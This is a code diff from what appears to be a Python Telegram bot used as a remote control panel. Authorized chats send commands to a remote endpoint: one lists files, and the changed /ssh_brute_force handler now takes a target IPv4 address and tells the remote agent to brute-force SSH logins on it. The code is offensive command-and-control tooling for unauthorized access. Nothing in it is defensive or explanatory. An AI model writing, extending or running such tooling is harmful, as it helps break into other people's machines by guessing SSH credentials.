@@ -31,7 +31,7 @@ def ls(update,context):
 		return
 		
 	if not validators.url(context.args[0]):
-		update.message.reply_text("Given argument is not an URL")
+		update.message.reply_text("First argument is not an URL")
 		return
 	
 	request = requests.post(context.args[0],data="ls&"+context.args[1])
@@ -45,15 +45,19 @@ def ssh_brute_force(update,context):
 
 	if not authorized(update.message.chat_id):return
 
-	if len(context.args) != 1:
-		update.message.reply_text("Usage: /ssh_brute_force <URL> , one and only one argument is required")
+	if len(context.args) != 2:
+		update.message.reply_text("Usage: /ssh_brute_force <URL> <IPv4>, only two arguments are required")
 		return
 		
 	if not validators.url(context.args[0]):
-		update.message.reply_text("Given argument is not an URL")
+		update.message.reply_text("First argument is not an URL")
 		return
 	
-	request = requests.post(context.args[0],data="ssh_brute_force")
+	if not validators.ip_address.ipv4(context.args[1]):
+		update.message.reply_text("Given ipv4 is not valid")
+		return
+	
+	request = requests.post(context.args[0],data="ssh_brute_force&"+context.args[1])
 	if request.status_code == 200:
 		update.message.reply_text(request.text)
 	else:
